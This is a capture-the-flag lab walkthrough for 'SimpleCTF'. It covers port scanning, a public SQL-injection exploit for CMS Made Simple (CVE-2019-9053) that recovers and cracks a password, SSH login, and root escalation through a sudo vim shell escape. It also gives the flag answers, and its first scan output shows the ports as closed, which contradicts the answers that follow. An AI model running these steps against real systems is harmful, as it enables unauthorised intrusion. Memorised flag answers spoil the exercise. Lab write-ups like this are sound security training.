# SimpleCTF

## #1 How many services are running under port 1000?
```
nmap <ip>
21/tcp   closed ftp
80/tcp   closed http
2222/tcp closed EtherNetIP-1
```
2
## #2 What is running on the higher port?
```
nmap -p2222 -sV -sC <ip>

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
SSH

## #3 What's the CVE you're using against the application?
CMS Made Simple version 2.2.8
CVE-2019-9053

## #4 To what kind of vulnerability is the application vulnerable?
SQLi

## #5 What's the password?
searchsploit cms made simple
searchsploit -m php/webapps/46635.py
python 46635.py -u http:// /simple -c -w /opt/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret


## #6 Where can you login with the details obtained?

ssh mitch@10.10.209.209 -p 2222


## #7 What's the user flag?
G00d j0b, keep up!



## #8 Is there any other user in the home directory? What's its name?

python -c "import pty; pty.spawn('/bin/bash')" 

cd
cd ..
ls
mitch  sunbath

## #9 What can you leverage to spawn a privileged shell?

sudo -l

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

sudo vim -c ':!/bin/sh'
python -c "import pty; pty.spawn('/bin/bash')"

## #10 What's the root flag?
W3ll d0n3. You made it!